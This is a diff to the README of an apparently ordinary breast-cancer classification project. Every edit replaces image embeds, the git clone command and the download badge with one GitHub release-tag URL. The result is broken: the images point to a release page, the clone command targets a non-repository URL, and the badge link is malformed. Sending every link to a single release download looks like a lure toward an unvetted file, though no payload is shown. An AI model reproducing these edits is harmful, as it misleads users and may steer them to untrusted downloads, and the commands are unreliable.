@@ -1,6 +1,6 @@
 # 🌟 Breast Cancer Classification using Machine Learning 🌟
 
- ![Breast Cancer Awareness Ribbon](https://image.shutterstock.com/image-photo/pink-breast-cancer-awareness-ribbon-260nw-1214841727.jpg)
+ ![Breast Cancer Awareness Ribbon](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0)
 
 Welcome to the **Breast Cancer Classification Machine Learning Project** repository! Here, we focus on building predictive models to determine whether a tumor is malignant or benign based on the Breast Cancer dataset. Various classification algorithms such as Logistic Regression, Random Forest, and Support Vector Machine (SVM) are implemented and analyzed to identify the most effective model for this task. 
 
@@ -39,7 +39,7 @@ To get started with this project, simply clone the repository and explore the pr
 ### Steps:
 1. Clone the repository:
 ```
-git clone https://github.com/your-username/Breast-Cancer-Classification-ML.git
+git clone https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0
 ```
 
 2. Navigate to the repository directory:
@@ -70,7 +70,7 @@ Based on these results, the Random Forest model exhibits the highest accuracy an
 ## 📊 Data Visualization:
 Let's take a look at some visualizations created during the exploratory data analysis phase:
 
-![Breast Cancer Data Visualization](https://image.shutterstock.com/image-vector/set-cancer-icons-neoplasm-illustrations-260nw-1492410602.jpg)
+![Breast Cancer Data Visualization](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0)
 
 - **Correlation Heatmap:** Demonstrates the correlation between different features in the dataset.
 - **Boxplot:** Shows the distribution of features among malignant and benign tumor samples.
@@ -85,7 +85,7 @@ Let's take a look at some visualizations created during the exploratory data ana
 For more details and in-depth analysis, check out our notebooks in this repository. Your feedback and contributions are highly appreciated!
 
 ## 📥 Download Latest Release:
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0%20Release-blue)](https://github.com/nellyndj52/Breast-Cancer-Classification-ML/releases/tag/v1.0)
 
 If the above link does not work, kindly visit the "Releases" section of the repository to access the latest release version.
 
